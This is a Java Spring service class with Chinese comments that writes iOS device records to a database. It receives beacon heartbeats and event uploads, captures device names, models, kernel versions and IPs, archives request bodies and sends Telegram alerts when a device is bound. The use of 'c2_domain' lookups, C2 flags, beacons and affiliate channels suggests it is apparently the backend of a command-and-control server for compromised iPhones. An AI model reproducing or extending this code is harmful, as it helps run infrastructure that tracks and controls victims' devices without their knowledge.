package com.device.service.impl;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.device.dao.ChannelDao;
import com.device.dao.DeviceDao;
import com.device.dao.Ios18ParamDao;
import com.device.dto.DeaconBody;
import com.device.entity.ChannelEntity;
import com.device.entity.DeviceEntity;
import com.device.entity.Ios18ParamEntity;
import com.device.util.DomainMatchUtil;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 18-device-server 异步落库写入器。
 * 异步线程池：{@code databaseOperateStreamPush}。 HTTP 请求线程只做读 body + 派发，预期请求耗时 <5ms。
 */
@Service
public class DeviceAsyncWriter {

	private static final Logger log = LoggerFactory.getLogger(DeviceAsyncWriter.class);

	@Autowired
	private DeviceDao deviceDao;

	@Autowired
	private Ios18ParamDao ios18ParamDao;

	@Autowired
	private ChannelDao channelDao;

	/** 飞机消息发送 Bean，必须通过外部注入调用才能走 @Async AOP 代理 */
	@Autowired
	private DeviceTelegramService deviceTelegramService;

	/**
	 * 已绑定设备心跳写库最小间隔（秒）。IP 变化或离线→在线仍立即写。
	 * 默认 60s，避免 /beacon 高频刷 UPDATE device。
	 */
	@Value("${device.beacon-device-update-interval-sec:60}")
	private long beaconDeviceUpdateIntervalSec;

	/**
	 * /event → ios18param 抽样归档间隔（秒）。0=不限流每次写入；
	 * &gt;0 时同设备间隔内最多 1 次，body 内容变化仍立即写。
	 */
	@Value("${device.event-param-archive-interval-sec:60}")
	private long eventParamArchiveIntervalSec;

	private final ConcurrentHashMap<String, ArchiveStamp> paramArchiveStamps = new ConcurrentHashMap<>();

	private static final class ArchiveStamp {
		final long atMs;
		final String bodyHash;

		ArchiveStamp(long atMs, String bodyHash) {
			this.atMs = atMs;
			this.bodyHash = bodyHash == null ? "" : bodyHash;
		}
	}

	/**
	 * 异步入库 ios18param（/a、/event、unimplemented 等；/beacon 不再归档）
	 */
	@Async("databaseOperateStreamPush")
	@Transactional
	public void capture(Ios18ParamEntity entity, boolean skipRedis) {
		try {
			if (entity != null) {
				String kind = entity.getKind() == null ? "" : entity.getKind().toLowerCase(Locale.ROOT);
				if ("beacon".equals(kind)) {
					log.debug("ios18param 跳过 kind=beacon（接口已停归档）");
					return;
				}
				if ("event".equals(kind)) {
					String uuid = firstNonEmpty(entity.getDeviceId(), entity.getLhu());
					String body = entity.getBody();
					if (body == null || body.isEmpty()) {
						log.debug("ios18param event 空 body 跳过 uuid={}", uuid);
						return;
					}
					if (eventParamArchiveIntervalSec > 0
							&& !shouldArchiveEvent(uuid, body, eventParamArchiveIntervalSec)) {
						log.debug("ios18param event 跳过写库(节流) uuid={} intervalSec={}",
								uuid, eventParamArchiveIntervalSec);
						return;
					}
				}
			}
			ios18ParamDao.insert(entity);
			log.info("ios18param写入成功 kind={} ip={} path={} ",
					entity == null ? null : entity.getKind(),
					entity == null ? null : entity.getClientIp(),
					entity == null ? null : entity.getPath());
		} catch (Exception e) {
			log.info("ios18param写入失败 kind={} ip={} path={} err={}",
					entity == null ? null : entity.getKind(),
					entity == null ? null : entity.getClientIp(),
					entity == null ? null : entity.getPath(),
					e.toString(), e);
		}
	}


	/**
	 * 从 /a 接口异步绑定或插入设备。
	 * <p>channelcode：仅当为空时按请求域名查 {@code qudao.c2_domain} 兜底；
	 * 已有非空渠道不覆盖（/register 写入的渠道不受影响）。
	 */
	@Async("databaseOperateStreamPush")
	@Transactional
	public void bindOrInsertFromA(String lhu, String domain, String clientIp, String model, String deviceName,
			String iosVersion, String buildVersion, String hostname, String sysname, String release,
			String kernelVersion, String source) {
		if (lhu == null || lhu.isEmpty()) {
			return;
		}
		try {
			DeviceEntity existing = deviceDao.findByDeviceId(lhu);
			double now = System.currentTimeMillis() / 1000.0;
			if (existing != null) {
				if (model != null && !model.isEmpty())
					existing.setModel(model);
				if (deviceName != null && !deviceName.isEmpty())
					existing.setDeviceName(deviceName);
				if (iosVersion != null && !iosVersion.isEmpty())
					existing.setIosVersion(iosVersion);
				existing.setIp(clientIp);
				existing.setBindPhase(1);
				existing.setDevicestatus(1);
				existing.setOnlinestatus(1);
				existing.setLastEventAt(now);
				existing.setC2Series(1);
				boolean filledChannel = fillChannelIfBlank(existing, domain);
				if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
					existing.setDomain(domain);
				}
				int temp = deviceDao.updateById(existing);
				log.debug("设备绑定状态更新成功 lhu={} ip={} channelFilled={}", lhu, clientIp, filledChannel);
				// 发送飞机消息 —— 走外部 Bean 调用，@Async 才会生效（类内 this 调用会跳过 AOP）
				if (temp > 0) {
					deviceTelegramService.notifyBindingByDeviceIdAsync(existing);
				}
			} else {
				// 未命中：INSERT；渠道优先域名兜底，查不到则空（等后续 register / beacon 再补）
				DeviceEntity newDevice = new DeviceEntity();
				newDevice.setDeviceId(lhu);
				newDevice.setDevice_id(lhu);
				newDevice.setChannelCode("");
				newDevice.setDomain(domain == null ? "" : domain);
				newDevice.setIp(clientIp);
				newDevice.setAddtime(now);
				newDevice.setIpstatus(0);
				newDevice.setDevicestatus(1);
				newDevice.setOnlinestatus(1);
				newDevice.setBindPhase(1);
				newDevice.setLastEventAt(now);
				newDevice.setModel(model == null ? "" : model);
				newDevice.setDeviceName(deviceName == null ? "" : deviceName);
				newDevice.setIosVersion(iosVersion == null ? "" : iosVersion);
				newDevice.setC2Series(1);
				fillChannelIfBlank(newDevice, domain);
				deviceDao.insert(newDevice);
				log.info("设备新增成功 lhu={} ip={} channel={}", lhu, clientIp, newDevice.getChannelCode());
			}
		} catch (Exception e) {
			log.info("/a 设备绑定失败 lhu={} ip={} err={}", lhu, clientIp, e.toString(), e);
		}
	}

	@Async("databaseOperateStreamPush")
	@Transactional
	public void addDevice(DeviceEntity newDevice) {
		try {
			DeviceEntity deviceEntity = deviceDao.findByDeviceid(newDevice.getDeviceId());
			if(deviceEntity == null) {
				deviceDao.insert(newDevice);
				log.info("设备预注册成功 uuid={} channel={} ip={}", newDevice.getDeviceId(), newDevice.getChannelCode(),
						newDevice.getIp());
			}else {
				deviceEntity.setChannelCode(newDevice.getChannelCode());
				deviceEntity.setDomain(newDevice.getDomain());
				deviceDao.updateById(deviceEntity);
				log.info("设备渠道绑定成功 uuid={} channel={} ip={}", newDevice.getDeviceId(), newDevice.getChannelCode(),
						newDevice.getIp());
			}
		} catch (Exception e) {
			log.info("预注册失败，跳过 uuid={} channel={} ip={}", newDevice.getDeviceId(), newDevice.getChannelCode(),
					newDevice.getIp());
		}
	}


	// ==================== 心跳（原 18-beacon-server） ====================

	/**
	 * /beacon 设备 upsert（三分支：新增 / 更新在线状态 / 补绑触发 Telegram）。
	 * 已绑定设备按 {@link #beaconDeviceUpdateIntervalSec} 限流 UPDATE；不写 ios18param。
	 * <p>channelcode 为空时按域名查 qudao 兜底；已有渠道不覆盖。
	 */
	@Async("databaseOperateStreamPush")
	@Transactional
	public void beaconAddDevice(String uuid, String domain, String clientIp, DeaconBody request) {
		if (uuid == null || uuid.isEmpty()) {
			return;
		}
		double now = System.currentTimeMillis() / 1000.0;
		DeviceEntity existing = deviceDao.findByDeviceId(uuid);

		if (existing == null) {
			DeviceEntity newDevice = new DeviceEntity();
			newDevice.setDeviceId(uuid);
			newDevice.setDevice_id(uuid);
			newDevice.setChannelCode("");
			newDevice.setDomain(domain == null ? "" : domain);
			newDevice.setIp(clientIp);
			newDevice.setAddtime(now);
			newDevice.setIpstatus(0);
			newDevice.setDevicestatus(1);
			newDevice.setOnlinestatus(1);
			newDevice.setBindPhase(1);
			newDevice.setLastEventAt(now);
			if (request.getDeviceInfo() != null) {
				newDevice.setIosVersion(request.getDeviceInfo().getIosVersion());
				newDevice.setDeviceName(request.getDeviceInfo().getNodename());
				newDevice.setModel(request.getDeviceInfo().getMachine());
			}
			newDevice.setC2Series(1);
			fillChannelIfBlank(newDevice, domain);
			try {
				deviceDao.insert(newDevice);
				log.info("/beacon 设备新增成功 uuid={} ip={} channel={}",
						uuid, clientIp, newDevice.getChannelCode());
			} catch (Exception e) {
				log.info("/beacon 设备新增失败 uuid={} ip={} err={}", uuid, clientIp, e.toString());
			}
		} else if (existing.getBindPhase() != null && existing.getBindPhase() == 1
				&& existing.getDevicestatus() != null && existing.getDevicestatus() == 1) {
			// 高频心跳：节流 UPDATE；渠道为空时仍立即补写
			String oldIp = existing.getIp() == null ? "" : existing.getIp();
			String newIp = clientIp == null ? "" : clientIp;
			boolean ipChanged = !oldIp.equals(newIp);
			boolean wasOffline = existing.getOnlinestatus() == null || existing.getOnlinestatus() != 1;
			Double last = existing.getLastEventAt();
			boolean stale = last == null
					|| (now - last) >= Math.max(1L, beaconDeviceUpdateIntervalSec);
			boolean needChannel = DomainMatchUtil.isBlank(existing.getChannelCode());
			boolean filledChannel = needChannel && fillChannelIfBlank(existing, domain);
			boolean filledDomain = false;
			if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
				existing.setDomain(domain);
				filledDomain = true;
			}
			if (!ipChanged && !wasOffline && !stale && !filledChannel && !filledDomain) {
				log.debug("/beacon 设备心跳跳过写库(节流) uuid={} intervalSec={}",
						uuid, beaconDeviceUpdateIntervalSec);
				return;
			}
			existing.setOnlinestatus(1);
			existing.setLastEventAt(now);
			existing.setC2Series(1);
			existing.setIp(clientIp);
			deviceDao.updateById(existing);
			log.info("/beacon 设备更新成功 uuid={} ip={} reason={}",
					uuid, clientIp,
					filledChannel ? "channel_fill"
							: (filledDomain ? "domain_fill"
							: (ipChanged ? "ip_changed" : (wasOffline ? "online" : "heartbeat"))));
		} else {
			existing.setBindPhase(1);
			existing.setDevicestatus(1);
			existing.setOnlinestatus(1);
			existing.setIp(clientIp);
			existing.setLastEventAt(now);
			existing.setC2Series(1);
			fillChannelIfBlank(existing, domain);
			if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
				existing.setDomain(domain);
			}
			if (request.getDeviceInfo() != null) {
				if (request.getDeviceInfo().getIosVersion() != null
						&& !request.getDeviceInfo().getIosVersion().isEmpty()) {
					existing.setIosVersion(request.getDeviceInfo().getIosVersion());
				}
				if (request.getDeviceInfo().getNodename() != null
						&& !request.getDeviceInfo().getNodename().isEmpty()) {
					existing.setDeviceName(request.getDeviceInfo().getNodename());
				}
				if (request.getDeviceInfo().getMachine() != null
						&& !request.getDeviceInfo().getMachine().isEmpty()) {
					existing.setModel(request.getDeviceInfo().getMachine());
				}
			}
			int temp = deviceDao.updateById(existing);
			if (temp > 0) {
				// 走外部 Bean 调用，@Async 才会生效（类内 this 调用会跳过 AOP）
				deviceTelegramService.notifyBindingByDeviceIdAsync(existing);
			}
			log.info("/beacon 设备补绑成功 uuid={} ip={} channel={}",
					uuid, clientIp, existing.getChannelCode());
		}
	}

	/**
	 * 仅当 device.channelcode 为空时，按域名查 qudao.c2_domain 写入。
	 * @return true 表示本次写入了渠道
	 */
	private boolean fillChannelIfBlank(DeviceEntity device, String domainRaw) {
		if (device == null || !DomainMatchUtil.isBlank(device.getChannelCode())) {
			return false;
		}
		String host = DomainMatchUtil.normalizeHost(domainRaw);
		if (host.isEmpty() && !DomainMatchUtil.isBlank(device.getDomain())) {
			host = DomainMatchUtil.normalizeHost(device.getDomain());
		}
		if (host.isEmpty()) {
			return false;
		}
		try {
			ChannelEntity ch = channelDao.findByC2DomainHost(host);
			if (ch == null || DomainMatchUtil.isBlank(ch.getChannelcode())) {
				log.debug("域名兜底未命中渠道 host={} device={}", host, device.getDeviceId());
				return false;
			}
			device.setChannelCode(ch.getChannelcode().trim());
			log.info("域名兜底写入渠道 device={} host={} channel={}",
					device.getDeviceId(), host, device.getChannelCode());
			return true;
		} catch (Exception e) {
			log.warn("域名兜底查渠道失败 host={} device={} err={}",
					host, device.getDeviceId(), e.toString());
			return false;
		}
	}

	/**
	 * 未实现路径 → 404 + unimplemented 归档（force_store，即使空 body 也入库）。
	 */
	@Async("databaseOperateStreamPush")
	@Transactional
	public void addUnimplemented(String uuid, String clientIp, String path,
			String headersJson, String method) {
		try {
			Ios18ParamEntity entity = new Ios18ParamEntity();
			entity.setBody("");
			entity.setCategory("未实现接口");
			entity.setClientIp(clientIp);
			entity.setDeviceId(uuid);
			entity.setHeaders(headersJson);
			entity.setKind("unimplemented");
			entity.setLhu(uuid);
			entity.setMethod(method);
			entity.setPath("/" + path);
			entity.setStorage("inline");
			entity.setUnimplemented(1);
			entity.setCategoryDir("00_未实现");
			entity.setBodyBytes(0);
			entity.setFilePath("");
			entity.setUnpackPath("");
			entity.setTt("");
			entity.setSource("");
			entity.setSeq((long) 0);
			entity.setAddtime(System.currentTimeMillis() / 1000.0);
			ios18ParamDao.insert(entity);
		} catch (Exception e) {
			log.info("addUnimplemented FAIL ip={} path={} err={}", clientIp, path, e.toString());
		}
	}

	/** /event 归档门禁：body 变化立即写；否则按 intervalSec 限流 */
	private boolean shouldArchiveEvent(String deviceId, String body, long intervalSec) {
		String id = deviceId == null ? "" : deviceId.trim();
		if (id.isEmpty()) {
			return true;
		}
		String key = "event|" + id;
		String hash = shortBodyHash(body);
		long nowMs = System.currentTimeMillis();
		long intervalMs = Math.max(1L, intervalSec) * 1000L;

		ArchiveStamp prev = paramArchiveStamps.get(key);
		if (prev != null) {
			boolean bodyChanged = !prev.bodyHash.equals(hash);
			boolean stale = (nowMs - prev.atMs) >= intervalMs;
			if (!bodyChanged && !stale) {
				return false;
			}
		}
		paramArchiveStamps.put(key, new ArchiveStamp(nowMs, hash));
		if (paramArchiveStamps.size() > 20000) {
			paramArchiveStamps.clear();
			paramArchiveStamps.put(key, new ArchiveStamp(nowMs, hash));
		}
		return true;
	}

	private static String firstNonEmpty(String a, String b) {
		if (a != null && !a.isEmpty()) {
			return a;
		}
		if (b != null && !b.isEmpty()) {
			return b;
		}
		return "";
	}

	private static String shortBodyHash(String body) {
		if (body == null || body.isEmpty()) {
			return "";
		}
		try {
			MessageDigest md = MessageDigest.getInstance("SHA-256");
			byte[] d = md.digest(body.getBytes(StandardCharsets.UTF_8));
			StringBuilder sb = new StringBuilder(16);
			for (int i = 0; i < 8; i++) {
				sb.append(String.format("%02x", d[i]));
			}
			return sb.toString();
		} catch (Exception e) {
			return Integer.toHexString(body.hashCode());
		}
	}

}
